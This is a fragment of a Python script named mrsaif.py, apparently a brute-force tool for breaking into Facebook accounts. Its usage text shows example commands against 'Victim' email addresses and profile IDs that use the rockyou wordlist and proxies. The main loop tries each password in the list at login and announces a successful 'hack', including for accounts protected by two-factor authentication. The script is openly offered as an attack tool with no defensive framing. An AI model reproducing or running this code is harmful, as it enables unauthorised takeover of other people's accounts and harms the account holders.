...
Usage: python ./mrsaif.py [OPTIONS...]
-------------
OPTIONS:
       |
    |--------
    ...
    |--------
    | -u/--update                             ::> Update mrsaif Script
-------------
Examples:
        |
     |--------
     | python mrsaif.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python mrsaif.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python mrsaif.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
     |--------
     | python mrsaif.py -t Victim@gmail.com -s 1234567
     |--------
     | python mrsaif.py -g https://www.facebook.com/Victim_Profile
     |--------
""")
...
def Main():
   ...
   if update:
    ...
    sys.exit(1)
        ...
        mrsaif.get_profile_id(target_profile)
        sys.exit(1)
        ...
        if proxy:
             ...
             if mrsaif.check_proxy(final_proxy):
                mrsaif.useProxy = final_proxy
                mrsaif.br.set_proxies({'https':mrsaif.useProxy, 'http':mrsaif.useProxy})
        ...
        mrsaif.banner(target,wordlist,single_passwd)
        ...
        for passwd in passwords:
                ...
                retCode = mrsaif.login(target, passwd)
                if retCode:
                    sys.stdout.write(wi+" ==> Login"+gr+" Success\n")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    print(wi+"["+gr+"+"+wi+"] Password [ "+gr+passwd+wi+" ]"+gr+" Is Correct :)")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    if retCode == 2:print(wi+"["+yl+"!"+wi+"]"+yl+" Enjoy: This is Hacked MrSaif ("+rd+"2F Authentication"+yl+"):"+rd+" Go And Open"+yl+" !!!")
                    break
                else:
